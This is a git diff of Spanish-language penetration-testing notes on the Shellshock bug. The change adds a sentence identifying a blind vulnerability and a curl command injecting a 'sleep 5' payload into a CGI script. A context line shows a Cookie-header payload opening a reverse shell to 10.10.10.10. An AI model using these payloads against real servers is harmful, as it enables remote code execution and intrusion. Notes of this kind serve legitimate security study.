@@ -747,5 +747,14 @@ curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http:
 ```
 
 `Identificando`
-en este caso el primer comando no nos ha funcionado así que parece que no es vulnerable a `RCE` sin embargo probamos el segundo comando el cual nos ha dado resultado después de 5 segundos. esto nos indica que la vulnerabilidad que esta aconteciendo aquí es una 
+en este caso el primer comando no nos ha funcionado así que parece que no es vulnerable a `RCE` sin embargo probamos el segundo comando el cual nos ha dado resultado después de 5 segundos. esto nos indica que la vulnerabilidad que esta aconteciendo aquí es una `Blind`
+
+```python
+
+# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
+
+curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
+
+```
+
 ![[Pasted image 20240622195528.png]]
